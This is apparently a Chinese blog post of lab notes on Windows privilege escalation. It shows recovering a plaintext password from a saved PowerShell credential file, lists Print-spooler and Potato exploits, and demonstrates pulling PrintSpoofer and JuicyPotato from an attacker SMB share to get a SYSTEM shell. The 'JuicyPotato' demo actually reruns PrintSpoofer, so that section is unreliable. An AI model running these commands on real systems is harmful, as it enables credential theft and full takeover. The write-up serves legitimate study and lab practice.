---
title: Windows 提权专区
date: 2026-03-02T14:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
is_long: true
---
## 枚举

### systeminfo

```bash
c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 JSON
OS Name:                   Microsoft Windows Server 2012 R2 Datacenter
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-80005-00001-AA602
Original Install Date:     5/22/2019, 4:27:16 PM
System Boot Time:          3/1/2026, 8:27:41 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              es-mx;Spanish (Mexico)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     8,191 MB
Available Physical Memory: 7,535 MB
Virtual Memory: Max Size:  9,471 MB
Virtual Memory: Available: 8,808 MB
Virtual Memory: In Use:    663 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.10.2
                                 IP address(es)
                                 [01]: 10.129.227.191
                                 [02]: fe80::f19f:1378:66b2:439f
                                 [03]: dead:beef::f19f:1378:66b2:439f
                                 [04]: dead:beef::4f
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

- OS Name：系统版本
- OS Version：内核版本
- Hotfix(s)：补丁安装情况

### Tasklist

查看 PID。

```bash
C:\Windows\system32>tasklist | findstr 612
tasklist | findstr 612
FileZilla Server.exe           612 Services                   0     10,432 K
```

### Whoami /priv

枚举当前用户权限。

```bash
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

### Net user

```bash
net user enil
```

### 寻找 `Users` `flag`

```bash
gci C:\Users\ -Filter *.txt -File -Recurse
```

### 读取 xml。

在 `sfitz` 的 `Document` 中发现文件 `connection.xml`。

```bash
PS C:\Users\sfitz\Documents> cat connection.xml
cat connection.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
    </Props>
  </Obj>
</Objs>
```

读取密码。

```bash
PS C:\Users\sfitz\Documents> $cred = import-clixml -Path connection.xml
$cred = import-clixml -Path connection.xml
PS C:\Users\sfitz\Documents> $cred.GetNetworkCredential().UserName
$cred.GetNetworkCredential().UserName
alaading
PS C:\Users\sfitz\Documents> $cred.GetNetworkCredential().Password
$cred.GetNetworkCredential().Password
f8gQ8fynP44ek1m3
```

方法二

```bash
PS C:\Users\sfitz\Documents> $pass = '01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6' | ConvertTo-SecureString
$pass = '01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6' | ConvertTo-SecureString
PS C:\Users\sfitz\Documents> $cred = New-Object System.Management.Automation.PSCredential('alaading',$pass)
$cred = New-Object System.Management.Automation.PSCredential('alaading',$pass)
PS C:\Users\sfitz\Documents> $cred.GetNetworkCredential() | fl
$cred.GetNetworkCredential() | fl


UserName       : alaading
Password       : f8gQ8fynP44ek1m3
SecurePassword : System.Security.SecureString
Domain         : 
```

## Print 系列漏洞

1. PrintNIghtmare
	- 滥用权限：SeLoadDriverPrivilege（特定情况），或者远程执行无需特殊权限
	- 描述：PrintNightmare 是一种漏洞，编号为 CVE-2021-34527，它影响了 Windows 的 `PrintSpooler` 服务，允许攻击者远程执行代码或者提升本地权限。虽然有些场景下需要 `SeloadDriverPrivilege` 来加载恶意驱动，但更多的时候是无权限限制的远程代码执行漏洞。
2. PrintSpoofer
	- 滥用的权限：SelmpersonatePrivilege
	- 描述：PrintSpoofer 利用了  `Print Spooler` 服务中的漏洞，同样滥用 `SeImpersonatePrivilege`。该工具通过 `Impersonation` 提权，攻击者可以从低权限提高至 SYSTEM。
3. PrintDemon
	- 滥用的权限：本地权限提升
	- 描述：PrintDemon（CVE-2020-1048）是一个 Windows 打印服务中的本地提权漏洞。它允许攻击者将恶意文件写入系统目录，从而实现代码执行或提权，此漏洞影响 Windows Print Spooler，攻击者可以通过操控打印队列中的临时文件来执行恶意操作。
4. CVE-2021-1675
	- 滥用的权限：本地权限提升、远程代码执行
	- 描述：这是 PrintNightmare 另一个变体，攻击者通过 `Print Spooler` 服务在没有特别权限的情况下执行任意代码。
5. MS-RPRN
	- 滥用的权限：远程代码执行
	- 描述：MS-RPRN 是 Windows 中的远程打印协议，该漏洞用于横向移动或远程代码执行。

## 土豆系列漏洞

1. Rotten Potato
	- 滥用的权限：SeImpersonatePribilege
	- 描述：Rotten Potato 利用了 Windows 中的 NTLM Relay 攻击，通过滥用具有 `SeImpersonatePribilege` 权限的进程来获取 SYSTEM 权限。
2. Jucie Potato
	- 滥用的权限：SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege
3. Rogue Potato
	- 滥用的权限 ：SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege
4. Sweet Potato
	- 滥用的权限：SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege
5. Potato.exe
	- 滥用的权限：SeImpersonatePrivilege
6. Smail Potato
	- 滥用的权限：SeImpersonatePrivilege
7. Ghost Potato
	- 滥用的权限：SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege

## 提权演示

### PrintSpoofer

将 PrintSpoofer 传进靶机。

```bash
c:\windows\system32\inetsrv>cd c:\programdata
cd c:\programdata

c:\ProgramData>mkdir apps
mkdir apps

c:\ProgramData>cd apps
cd apps

c:\ProgramData\apps>copy \\10.10.16.155\Enil\PrintSpoofer64.exe .\PrintSpoofer64.exe
copy \\10.10.16.155\Enil\PrintSpoofer64.exe .\PrintSpoofer64.exe
        1 file(s) copied.

c:\ProgramData\apps>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AEF2-0DF2

 Directory of c:\ProgramData\apps

03/02/2026  03:00 AM    <DIR>          .
03/02/2026  03:00 AM    <DIR>          ..
03/02/2026  02:55 AM            27,136 PrintSpoofer64.exe
               1 File(s)         27,136 bytes
               2 Dir(s)   4,617,351,168 bytes free
```

尝试执行提权。

```bash
c:\ProgramData\apps>PrintSpoofer64.exe -i -c cmd.exe
PrintSpoofer64.exe -i -c cmd.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

### JuciePotato

将 JuicyPotato.exe 传入靶机。

```bash
c:\ProgramData\apps>copy \\10.10.16.155\Enil\JuicyPotato.exe .\JuicyPotato.exe
copy \\10.10.16.155\Enil\JuicyPotato.exe .\JuicyPotato.exe
        1 file(s) copied.

c:\ProgramData\apps>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AEF2-0DF2

 Directory of c:\ProgramData\apps

03/02/2026  03:40 AM    <DIR>          .
03/02/2026  03:40 AM    <DIR>          ..
12/06/2021  06:35 PM           347,648 JuicyPotato.exe
03/02/2026  02:55 AM            27,136 PrintSpoofer64.exe
               2 File(s)        374,784 bytes
               2 Dir(s)   4,617,109,504 bytes free
```

利用提权。

```bash
c:\ProgramData\apps>PrintSpoofer64.exe -i -c cmd.exe
PrintSpoofer64.exe -i -c cmd.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

